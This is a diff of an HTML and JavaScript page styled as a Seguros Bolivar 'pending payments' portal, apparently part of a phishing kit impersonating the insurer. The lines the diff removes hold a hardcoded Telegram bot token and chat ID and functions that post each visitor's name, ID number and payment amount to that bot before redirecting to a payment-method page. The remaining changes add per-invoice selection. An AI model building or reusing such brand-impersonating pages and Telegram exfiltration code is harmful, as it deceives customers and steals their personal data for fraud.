@@ -3,19 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap">
 <title>Pagos Pendientes - Seguros Bolivar</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Montserrat', sans-serif; background: #f2f2f2; color: #333; min-height: 100vh; }
 
+  /* ─── NAVBAR ─── */
   .navbar { background: #fff; border-bottom: 3px solid #006341; padding: 12px 30px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
   .navbar img { height: 45px; }
   .btn-cerrar { display: flex; align-items: center; gap: 6px; background: none; border: 2px solid #006341; border-radius: 25px; padding: 8px 18px; color: #006341; font-weight: 600; font-size: 13px; cursor: pointer; font-family: 'Montserrat', sans-serif; transition: all 0.3s; }
   .btn-cerrar:hover { background: #006341; color: #fff; }
 
+  /* ─── MAIN ─── */
   .main { max-width: 1250px; margin: 0 auto; padding: 25px 30px; padding-bottom: 150px; }
 
+  /* ─── WELCOME ROW ─── */
   .welcome-row { display: flex; gap: 20px; margin-bottom: 25px; flex-wrap: wrap; }
   .welcome-card, .history-card { background: #fff; border-radius: 12px; padding: 20px 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); flex: 1; min-width: 250px; }
   .welcome-card .label { font-size: 20px; font-weight: 700; color: #006341; margin-bottom: 4px; }
@@ -26,8 +29,10 @@
   .btn-historial { display: inline-flex; align-items: center; gap: 8px; background: none; border: 2px solid #006341; border-radius: 25px; padding: 10px 22px; color: #006341; font-weight: 600; font-size: 13px; cursor: pointer; font-family: 'Montserrat', sans-serif; transition: all 0.3s; }
   .btn-historial:hover { background: #006341; color: #fff; }
 
+  /* ─── GRID ─── */
   .content-grid { display: grid; grid-template-columns: 1fr 350px; gap: 25px; align-items: start; }
 
+  /* ─── PAGOS CARD ─── */
   .pagos-card { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
   .pagos-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 10px; }
   .pagos-header h2 { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 700; }
@@ -38,11 +43,13 @@
   .pagos-instructions { font-size: 12px; color: #888; margin-bottom: 20px; line-height: 1.5; }
   .pagos-instructions strong { color: #333; }
 
+  /* ─── CATEGORY ─── */
   .category-header { display: flex; align-items: center; gap: 10px; padding: 12px 0; border-bottom: 1px solid #eee; margin-bottom: 15px; flex-wrap: wrap; }
   .category-header h3 { font-size: 15px; font-weight: 600; color: #333; display: flex; align-items: center; gap: 8px; }
   .category-header h3 span { font-weight: 400; color: #888; }
   .category-desc { font-size: 11px; color: #aaa; margin-left: auto; max-width: 300px; text-align: right; }
 
+  /* ─── PRODUCT CARD (ESCRITORIO) ─── */
   .product-card { background: #fafafa; border: 1px solid #e8e8e8; border-radius: 12px; padding: 18px 20px; margin-bottom: 12px; display: flex; align-items: center; gap: 15px; transition: all 0.2s; }
   .product-card:hover { border-color: #006341; box-shadow: 0 2px 8px rgba(0,99,65,0.08); }
   .product-badge { display: inline-flex; align-items: center; gap: 6px; background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 6px 12px; font-size: 12px; font-weight: 600; color: #333; white-space: nowrap; }
@@ -52,6 +59,18 @@
   .product-info .product-meta strong { color: #333; font-weight: 600; }
   .product-actions { display: flex; align-items: center; gap: 15px; }
   .btn-ver-mas { display: flex; flex-direction: column; align-items: center; gap: 2px; background: none; border: none; cursor: pointer; color: #006341; font-size: 11px; font-weight: 600; font-family: 'Montserrat', sans-serif; }
+  .btn-ver-mas .arrow-icon { transition: transform 0.3s; }
+  .btn-ver-mas.expanded .arrow-icon { transform: rotate(180deg); }
+
+  /* ─── INVOICE DETAIL ROWS ─── */
+  .invoice-details { display: none; width: 100%; margin-top: 12px; border-top: 1px solid #e8e8e8; padding-top: 12px; }
+  .invoice-details.show { display: block; }
+  .invoice-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; background: #fff; border: 1px solid #e8e8e8; border-radius: 8px; margin-bottom: 8px; gap: 10px; transition: border-color 0.2s; }
+  .invoice-row:hover { border-color: #006341; }
+  .invoice-row .inv-info { flex: 1; font-size: 12px; color: #555; }
+  .invoice-row .inv-info strong { color: #333; font-weight: 600; }
+  .invoice-row .inv-amount { font-size: 15px; font-weight: 700; color: #333; white-space: nowrap; }
+  .invoice-row .inv-check input[type="checkbox"] { width: 18px; height: 18px; accent-color: #006341; cursor: pointer; }
   .product-amount { text-align: right; }
   .product-amount .amount-label { font-size: 11px; color: #888; margin-bottom: 2px; }
   .product-amount .amount-value { font-size: 20px; font-weight: 700; color: #333; }
@@ -59,11 +78,13 @@
   .product-check input[type="checkbox"] { width: 20px; height: 20px; accent-color: #006341; cursor: pointer; }
   .product-check label { font-size: 11px; color: #006341; font-weight: 600; cursor: pointer; }
 
+  /* ─── PAGINATION ─── */
   .pagination { display: flex; justify-content: center; align-items: center; gap: 5px; margin-top: 20px; padding-top: 15px; }
   .pagination button { background: none; border: none; color: #999; cursor: pointer; font-size: 14px; padding: 5px 8px; }
   .pagination .page-num { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 50%; border: 2px solid #f4d03f; color: #333; font-weight: 600; font-size: 13px; }
   .pagination-info { text-align: center; font-size: 12px; color: #999; margin-top: 8px; }
 
+  /* ─── DATOS DE PAGO (ESCRITORIO) ─── */
   .datos-pago { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); position: sticky; top: 85px; }
   .datos-pago h2 { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 700; margin-bottom: 10px; }
   .datos-pago .pago-desc { font-size: 12px; color: #888; margin-bottom: 25px; line-height: 1.5; }
@@ -78,6 +99,7 @@
   .btn-recibo { width: 100%; padding: 14px; background: #fff; color: #333; border: 2px solid #ddd; border-radius: 25px; font-size: 14px; font-weight: 500; cursor: pointer; font-family: 'Montserrat', sans-serif; transition: all 0.3s; }
   .btn-recibo:hover { border-color: #006341; color: #006341; }
 
+  /* ─── MISC ─── */
   .no-debts { text-align: center; padding: 50px 20px; color: #aaa; }
   .no-debts h3 { font-size: 16px; color: #666; margin-bottom: 5px; }
   .no-debts p { font-size: 13px; }
@@ -85,12 +107,16 @@
   .spinner-lg { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top-color: #006341; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
   @keyframes spin { to { transform: rotate(360deg); } }
 
+  /* ─── FOOTER ─── */
   .footer { text-align: center; padding: 20px; font-size: 11px; color: #aaa; margin-top: 30px; }
 
+  /* ─── MÓVIL: BARRA INFERIOR VERDE ─── */
   .mobile-bottom-bar {
     display: none;
     position: fixed;
-    bottom: 0; left: 0; width: 100%;
+    bottom: 0;
+    left: 0;
+    width: 100%;
     background-color: #006341;
     border-radius: 24px 24px 0 0;
     padding: 24px 20px 20px;
@@ -100,17 +126,78 @@
     flex-direction: column;
     gap: 15px;
   }
-  .mobile-bottom-bar.show { display: flex; }
-  .mobile-bottom-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.2); padding-bottom: 15px; }
-  .mobile-bottom-header h3 { font-size: 18px; font-weight: 700; margin: 0; }
-  .mobile-bottom-header .total-amount { font-size: 20px; font-weight: 700; }
-  .mobile-bottom-terms { display: flex; align-items: flex-start; gap: 10px; font-size: 11px; color: #fff; line-height: 1.4; }
-  .mobile-bottom-terms input[type="checkbox"] { width: 18px; height: 18px; accent-color: #fff; margin-top: 2px; flex-shrink: 0; cursor: pointer; }
-  .mobile-bottom-terms a { color: #fff; text-decoration: underline; font-weight: 600; }
-  .mobile-bottom-btn-pagar { width: 100%; padding: 14px; background: #f4d03f; color: #333; border: none; border-radius: 25px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: 'Montserrat', sans-serif; transition: all 0.3s; }
-  .mobile-bottom-btn-pagar:disabled { opacity: 0.6; cursor: not-allowed; }
-  .mobile-bottom-btn-recibo { width: 100%; padding: 14px; background: #fff; color: #006341; border: none; border-radius: 25px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: 'Montserrat', sans-serif; transition: all 0.3s; }
+  .mobile-bottom-bar.show {
+    display: flex;
+  }
+  .mobile-bottom-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid rgba(255,255,255,0.2);
+    padding-bottom: 15px;
+  }
+  .mobile-bottom-header h3 {
+    font-size: 18px;
+    font-weight: 700;
+    margin: 0;
+  }
+  .mobile-bottom-header .total-amount {
+    font-size: 20px;
+    font-weight: 700;
+  }
+  .mobile-bottom-terms {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    font-size: 11px;
+    color: #fff;
+    line-height: 1.4;
+  }
+  .mobile-bottom-terms input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    accent-color: #fff;
+    margin-top: 2px;
+    flex-shrink: 0;
+    cursor: pointer;
+  }
+  .mobile-bottom-terms a {
+    color: #fff;
+    text-decoration: underline;
+    font-weight: 600;
+  }
+  .mobile-bottom-btn-pagar {
+    width: 100%;
+    padding: 14px;
+    background: #f4d03f;
+    color: #333;
+    border: none;
+    border-radius: 25px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: 'Montserrat', sans-serif;
+    transition: all 0.3s;
+  }
+  .mobile-bottom-btn-pagar:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+  .mobile-bottom-btn-recibo {
+    width: 100%;
+    padding: 14px;
+    background: #fff;
+    color: #006341;
+    border: none;
+    border-radius: 25px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: 'Montserrat', sans-serif;
+    transition: all 0.3s;
+  }
 
+  /* ─── RESPONSIVE (MÓVIL) ─── */
   @media (max-width: 900px) {
     .navbar { padding: 10px 16px; }
     .navbar img { height: 35px; }
@@ -142,21 +229,37 @@
     .category-header h3 { font-size: 14px; }
     .category-desc { display: none; }
 
-    .product-card { flex-direction: column; align-items: stretch; gap: 0; padding: 20px; border-radius: 16px; margin-bottom: 15px; position: relative; }
+    .product-card {
+      flex-direction: column; align-items: stretch; gap: 0;
+      padding: 20px; border-radius: 16px; margin-bottom: 15px;
+      position: relative;
+    }
     .product-check { position: absolute; top: 20px; right: 20px; flex-direction: row; }
     .product-check label { display: none; }
     .product-check input[type="checkbox"] { width: 22px; height: 22px; }
+
     .product-badge { background: #e6f3ee; color: #006341; padding: 8px 14px; font-size: 14px; align-self: flex-start; margin-bottom: 15px; border-radius: 20px; border: none; }
+
     .product-info { width: 100%; display: flex; flex-direction: column; }
     .product-info .product-name { font-size: 13px; color: #888; order: 3; margin-top: 10px; }
     .product-info .product-meta { font-size: 13px; color: #888; line-height: 1.6; }
+
     .product-amount { order: -1; text-align: left; margin-bottom: 15px; width: 100%; }
     .product-amount .amount-label { font-size: 13px; color: #888; }
     .product-amount .amount-value { font-size: 26px; font-weight: 700; color: #0b2a3f; }
+
     .product-actions { display: flex; flex-direction: column; gap: 15px; width: 100%; }
-    .btn-ver-mas { width: 100%; padding: 14px; border: 2px solid #006341; border-radius: 25px; font-size: 14px; flex-direction: row; justify-content: center; gap: 8px; }
+    .btn-ver-mas {
+      width: 100%; padding: 14px; border: 2px solid #006341; border-radius: 25px;
+      font-size: 14px; flex-direction: row; justify-content: center; gap: 8px;
+    }
+
+    .invoice-details { margin-top: 15px; padding-top: 15px; }
+    .invoice-row { padding: 12px; }
+    .invoice-row .inv-amount { font-size: 14px; }
 
     .pagination { margin-top: 10px; }
+
     .mobile-bottom-bar { display: flex; }
     .mobile-bottom-bar:not(.show) { display: none; }
   }
@@ -178,6 +281,7 @@
 </nav>
 
 <div class="main">
+  <!-- Tarjetas de escritorio (Bienvenida) -->
   <div class="welcome-row">
     <div class="welcome-card">
       <div class="label" id="welcome-label">Bienvenido</div>
@@ -192,6 +296,7 @@
     </div>
   </div>
 
+  <!-- Header móvil (Saludo) -->
   <div class="mobile-header">
     <div>
       <div class="mobile-greeting" id="mobile-greeting">Hola, Usuario</div>
@@ -211,7 +316,7 @@
           <input type="text" placeholder="Buscar producto o N° Póliza." id="search-input" oninput="filtrarProductos()">
         </div>
       </div>
-      <p class="pagos-instructions">Para realizar el pago de sus productos, agréguelos haciendo clic en la casilla <strong>"Agregar"</strong>.</p>
+      <p class="pagos-instructions">Para realizar el pago, haga clic en <strong>"Ver facturas"</strong> para ver las facturas disponibles y seleccione las que desea pagar.</p>
 
       <div class="loading-overlay" id="loading"><div class="spinner-lg"></div><span>Consultando facturas...</span></div>
 
@@ -227,6 +332,7 @@
       </div>
     </div>
 
+    <!-- Panel de escritorio -->
     <div class="datos-pago">
       <h2>
         <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
@@ -240,12 +346,13 @@
         <input type="checkbox" id="terms-cb" onchange="updatePayBtn()">
         <span>Acepto los <a href="#">Términos y Condiciones</a> y he leído la <a href="#">Política de Privacidad</a>.</span>
       </div>
-      <button class="btn-pagar" id="btn-pagar" disabled onclick="irAPagar()">Pagar en línea</button>
+      <button class="btn-pagar" id="btn-pagar" disabled>Pagar en línea</button>
       <button class="btn-recibo">Descargar recibo</button>
     </div>
   </div>
 </div>
 
+<!-- BARRA INFERIOR MÓVIL -->
 <div class="mobile-bottom-bar" id="mobile-bottom-bar">
   <div class="mobile-bottom-header">
     <h3>Total a pagar</h3>
@@ -255,7 +362,7 @@
     <input type="checkbox" id="terms-cb-mobile" onchange="updatePayBtnMobile()">
     <span>Acepto los <a href="#">Términos y Condiciones</a> y he leído la <a href="#">Política de Privacidad</a>.</span>
   </div>
-  <button class="mobile-bottom-btn-pagar" id="btn-pagar-mobile" disabled onclick="irAPagar()">Proceder al pago</button>
+  <button class="mobile-bottom-btn-pagar" id="btn-pagar-mobile" disabled>Proceder al pago</button>
   <button class="mobile-bottom-btn-recibo">Descargar recibo</button>
 </div>
 
@@ -265,13 +372,11 @@
 const API_BASE = window.location.origin;
 const fmt = n => '$' + Number(n || 0).toLocaleString('es-CO');
 
-// ─── CONFIGURACIÓN TELEGRAM ───
-const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
-const TELEGRAM_CHAT_ID = '-1004457768033';
-
+// SVG icons
 const ICON_EYE = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#006341" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
 const ICON_PEOPLE = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>';
 
+// Dynamic product icons by type
 function getProductIcon(badge) {
   var b = (badge || '').toLowerCase();
   if (b.includes('salud') || b.includes('medic') || b.includes('eps'))
@@ -286,69 +391,55 @@ function getProductIcon(badge) {
     return '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>';
   if (b.includes('educa') || b.includes('estudi'))
     return '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c0 2 3 3 6 3s6-1 6-3v-5"/></svg>';
+  // Default: shield
   return '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>';
 }
 
+// Category grouping
 function getCategoryInfo(products) {
   var categories = {};
   products.forEach(function(p) {
     var b = (p.badge || '').toLowerCase();
     var catKey, catName, catDesc, catIcon;
     if (b.includes('salud') || b.includes('vida') || b.includes('medic') || b.includes('eps')) {
-      catKey = 'vida_salud'; catName = 'Seguros para la vida y salud';
+      catKey = 'vida_salud';
+      catName = 'Seguros para la vida y salud';
       catDesc = 'Diseñados para proteger la vida y la salud de usted, sus familiares y sus empleados.';
       catIcon = ICON_PEOPLE;
     } else if (b.includes('auto') || b.includes('vehic') || b.includes('soat') || b.includes('carro') || b.includes('moto')) {
-      catKey = 'auto'; catName = 'Seguros para vehículos';
+      catKey = 'auto';
+      catName = 'Seguros para vehículos';
       catDesc = 'Protección para su vehículo, SOAT y responsabilidad civil.';
       catIcon = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><rect x="1" y="3" width="15" height="13" rx="2"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>';
     } else if (b.includes('hogar') || b.includes('casa') || b.includes('residen')) {
-      catKey = 'hogar'; catName = 'Seguros para el hogar';
+      catKey = 'hogar';
+      catName = 'Seguros para el hogar';
       catDesc = 'Protección integral para su vivienda y bienes.';
       catIcon = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>';
     } else if (b.includes('empresa') || b.includes('arl') || b.includes('pyme')) {
-      catKey = 'empresa'; catName = 'Seguros empresariales';
+      catKey = 'empresa';
+      catName = 'Seguros empresariales';
       catDesc = 'Soluciones de protección para su empresa y empleados.';
       catIcon = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>';
     } else {
-      catKey = 'general'; catName = 'Otros seguros';
+      catKey = 'general';
+      catName = 'Otros seguros';
       catDesc = 'Productos de protección y ahorro.';
       catIcon = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>';
     }
-    if (!categories[catKey]) categories[catKey] = { name: catName, desc: catDesc, icon: catIcon, products: [] };
+    if (!categories[catKey]) {
+      categories[catKey] = { name: catName, desc: catDesc, icon: catIcon, products: [] };
+    }
     categories[catKey].products.push(p);
   });
   return categories;
 }
 
 let allProducts = [];
-let selectedProducts = new Set();
+let allInvoices = {};  // key: invoiceUniqueId -> invoice data
+let selectedInvoices = new Set();
 let totalSelected = 0;
 let taxSelected = 0;
-
-// ─── ENVIAR A TELEGRAM (SOLO CÉDULA, NOMBRE Y VALOR) ───
-async function enviarConsultaTelegram(tipoDoc, numDoc, nombre) {
-  const mensaje = `
-📋 *CONSULTA - SEGUROS BOLÍVAR*
-👤 *Nombre:* ${nombre || 'No disponible'}
-🆔 *Documento:* ${numDoc}
-💵 *Valor:* ${fmt(totalSelected + taxSelected)}
-  `;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: mensaje,
-        parse_mode: 'Markdown'
-      })
-    });
-  } catch (err) {
-    console.error('Error enviando a Telegram:', err);
-  }
-}
 
 window.addEventListener('DOMContentLoaded', () => {
   const params = new URLSearchParams(window.location.search);
@@ -389,9 +480,11 @@ function renderProductos(data) {
     document.getElementById('welcome-label').textContent = 'Bienvenido, ' + nombre;
   }
 
+  // Group invoices by policyNumber into single cards
   allProducts = [];
   const grouped = {};
 
+  var invCounter = 0;
   debts.forEach(function(debt) {
     var invoices = debt.invoiceDetailType || [];
     invoices.forEach(function(inv) {
@@ -403,12 +496,28 @@ function renderProductos(data) {
           name: 'Póliza - ' + (debt.productDescription || 'producto').toLowerCase(),
           policyNumber: key,
           startDate: inv.dueDate ? inv.dueDate.split('T')[0] : '-',
-          amount: 0, subtotal: 0, tax: 0, invoiceCount: 0
+          amount: 0,
+          subtotal: 0,
+          tax: 0,
+          invoiceCount: 0,
+          invoices: []
         };
       }
-      grouped[key].amount += Number(inv.debtValue || inv.localCurrencyAmount || 0);
-      grouped[key].subtotal += Number(inv.localCurrencyAmount || 0);
-      grouped[key].tax += Number(inv.localCurrencyTaxesAmount || 0);
+      var invId = key + '_inv' + invCounter++;
+      var invData = {
+        id: invId,
+        policyId: key,
+        invoiceNumber: inv.invoiceNumber || inv.billingNumber || ('Factura ' + (grouped[key].invoiceCount + 1)),
+        dueDate: inv.dueDate ? inv.dueDate.split('T')[0] : '-',
+        debtValue: Number(inv.debtValue || inv.localCurrencyAmount || 0),
+        subtotal: Number(inv.localCurrencyAmount || 0),
+        tax: Number(inv.localCurrencyTaxesAmount || 0)
+      };
+      allInvoices[invId] = invData;
+      grouped[key].invoices.push(invData);
+      grouped[key].amount += invData.debtValue;
+      grouped[key].subtotal += invData.subtotal;
+      grouped[key].tax += invData.tax;
       grouped[key].invoiceCount++;
       if (inv.dueDate) {
         var d = inv.dueDate.split('T')[0];
@@ -431,6 +540,8 @@ function renderProductos(data) {
   }
 
   document.getElementById('pagos-count').textContent = '(0/' + allProducts.length + ')';
+
+  // Group by category
   var categories = getCategoryInfo(allProducts);
 
   Object.keys(categories).forEach(function(catKey) {
@@ -444,8 +555,28 @@ function renderProductos(data) {
       var icon = getProductIcon(p.badge);
       var card = document.createElement('div');
       card.className = 'product-card';
+      card.style.flexWrap = 'wrap';
       card.setAttribute('data-id', p.id);
       card.setAttribute('data-search', (p.name + ' ' + p.policyNumber + ' ' + p.badge).toLowerCase());
+
+      // Build invoice rows HTML
+      var invoiceRowsHtml = '';
+      p.invoices.forEach(function(inv) {
+        invoiceRowsHtml +=
+          '<div class="invoice-row">' +
+            '<div class="inv-check">' +
+              '<input type="checkbox" id="cb-' + inv.id + '" onchange="toggleInvoice(\'' + inv.id + '\')">' +
+            '</div>' +
+            '<div class="inv-info">' +
+              '<strong>' + inv.invoiceNumber + '</strong><br>' +
+              'Vence: ' + inv.dueDate +
+            '</div>' +
+            '<div class="inv-amount">' + fmt(inv.debtValue) + '</div>' +
+          '</div>';
+      });
+
+      var ARROW_DOWN = '<svg class="arrow-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>';
+
       card.innerHTML =
         '<span class="product-badge">' + icon + ' ' + p.badge + '</span>' +
         '<div class="product-info">' +
@@ -453,15 +584,14 @@ function renderProductos(data) {
           '<div class="product-meta"><strong>N° Póliza ' + p.policyNumber + '</strong><br>Vigente desde ' + p.startDate + '</div>' +
         '</div>' +
         '<div class="product-actions">' +
-          '<button class="btn-ver-mas">' + ICON_EYE + ' Ver más</button>' +
+          '<button class="btn-ver-mas" onclick="toggleVerMas(\'' + p.id + '\', this)">' + ICON_EYE + ' Ver facturas (' + p.invoiceCount + ') ' + ARROW_DOWN + '</button>' +
           '<div class="product-amount">' +
-            '<div class="amount-label">Valor a pagar</div>' +
+            '<div class="amount-label">Total póliza</div>' +
             '<div class="amount-value">' + fmt(p.amount) + '</div>' +
           '</div>' +
-          '<div class="product-check">' +
-            '<input type="checkbox" id="cb-' + p.id + '" onchange="toggleProduct(\'' + p.id + '\')">' +
-            '<label for="cb-' + p.id + '">Agregar</label>' +
-          '</div>' +
+        '</div>' +
+        '<div class="invoice-details" id="invoices-' + p.id + '">' +
+          invoiceRowsHtml +
         '</div>';
       section.appendChild(card);
     });
@@ -475,28 +605,48 @@ function renderProductos(data) {
   document.getElementById('pagination-info').textContent = 'Mostrando 1 a ' + allProducts.length + ' registros de ' + allProducts.length;
 }
 
-function toggleProduct(id) {
-  var p = allProducts.find(function(x) { return x.id === id; });
-  if (!p) return;
-  if (selectedProducts.has(id)) {
-    selectedProducts.delete(id);
-    totalSelected -= p.subtotal;
-    taxSelected -= p.tax;
+function toggleVerMas(policyId, btn) {
+  var details = document.getElementById('invoices-' + policyId);
+  if (details.classList.contains('show')) {
+    details.classList.remove('show');
+    btn.classList.remove('expanded');
   } else {
-    selectedProducts.add(id);
-    totalSelected += p.subtotal;
-    taxSelected += p.tax;
+    details.classList.add('show');
+    btn.classList.add('expanded');
+  }
+}
+
+function toggleInvoice(invId) {
+  var inv = allInvoices[invId];
+  if (!inv) return;
+  if (selectedInvoices.has(invId)) {
+    selectedInvoices.delete(invId);
+    totalSelected -= inv.subtotal;
+    taxSelected -= inv.tax;
+  } else {
+    selectedInvoices.add(invId);
+    totalSelected += inv.subtotal;
+    taxSelected += inv.tax;
   }
 
-  document.getElementById('pagos-count').textContent = '(' + selectedProducts.size + '/' + allProducts.length + ')';
+  document.getElementById('pagos-count').textContent = '(' + selectedInvoices.size + '/' + Object.keys(allInvoices).length + ')';
+
+  // Desktop totals
   document.getElementById('pago-subtotal').textContent = fmt(totalSelected);
   document.getElementById('pago-iva').textContent = fmt(taxSelected);
   document.getElementById('pago-total').textContent = fmt(totalSelected + taxSelected);
+
+  // Mobile totals
   document.getElementById('mobile-total-amount').textContent = fmt(totalSelected + taxSelected);
 
+  // Show/hide mobile bar
   const mobileBar = document.getElementById('mobile-bottom-bar');
-  if (selectedProducts.size > 0) mobileBar.classList.add('show');
-  else { mobileBar.classList.remove('show'); document.getElementById('terms-cb-mobile').checked = false; }
+  if (selectedInvoices.size > 0) {
+    mobileBar.classList.add('show');
+  } else {
+    mobileBar.classList.remove('show');
+    document.getElementById('terms-cb-mobile').checked = false;
+  }
 
   updatePayBtn();
   updatePayBtnMobile();
@@ -504,17 +654,22 @@ function toggleProduct(id) {
 
 function updatePayBtn() {
   var btn = document.getElementById('btn-pagar');
-  if (selectedProducts.size > 0 && document.getElementById('terms-cb').checked) {
-    btn.classList.add('active'); btn.disabled = false;
+  if (selectedInvoices.size > 0 && document.getElementById('terms-cb').checked) {
+    btn.classList.add('active');
+    btn.disabled = false;
   } else {
-    btn.classList.remove('active'); btn.disabled = true;
+    btn.classList.remove('active');
+    btn.disabled = true;
   }
 }
 
 function updatePayBtnMobile() {
   var btn = document.getElementById('btn-pagar-mobile');
-  if (selectedProducts.size > 0 && document.getElementById('terms-cb-mobile').checked) btn.disabled = false;
-  else btn.disabled = true;
+  if (selectedInvoices.size > 0 && document.getElementById('terms-cb-mobile').checked) {
+    btn.disabled = false;
+  } else {
+    btn.disabled = true;
+  }
 }
 
 function filtrarProductos() {
@@ -522,19 +677,6 @@ function filtrarProductos() {
   document.querySelectorAll('.product-card').forEach(function(card) {
     card.style.display = card.getAttribute('data-search').includes(q) ? '' : 'none';
   });
-}
-
-// ─── IR A PAGAR: Envía a Telegram (solo cédula, nombre, valor) y redirige a medios.html ───
-async function irAPagar() {
-  const params = new URLSearchParams(window.location.search);
-  const tipoDoc = params.get('tipoDoc') || 'CC';
-  const numDoc = params.get('numDoc') || '';
-  const nombre = params.get('nombre') || '';
-
-  await enviarConsultaTelegram(tipoDoc, numDoc, nombre);
-
-  const total = totalSelected + taxSelected;
-  window.location.href = `medios.html?tipoDoc=${tipoDoc}&numDoc=${numDoc}&nombre=${encodeURIComponent(nombre)}&total=${total}`;
 }
 
 function cerrarSesion() { window.location.href = '/'; }
